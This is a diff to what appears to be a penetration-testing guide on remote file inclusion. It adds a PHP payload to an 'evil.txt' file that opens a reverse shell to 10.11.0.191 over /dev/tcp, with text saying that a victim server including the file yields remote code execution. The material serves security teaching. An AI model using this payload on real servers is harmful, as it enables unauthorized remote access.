@@ -23,6 +23,10 @@ And evil.txt will look like something like this:
 
 ```
 <?php echo shell_exec("whoami");?>
+
+# Or just get a reverse shell directly like this:
+<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>
+
 ```
 
 So when the victim-server includes this file it will automatically execute the commands that are in the evil.txt file. And we have a RCE.
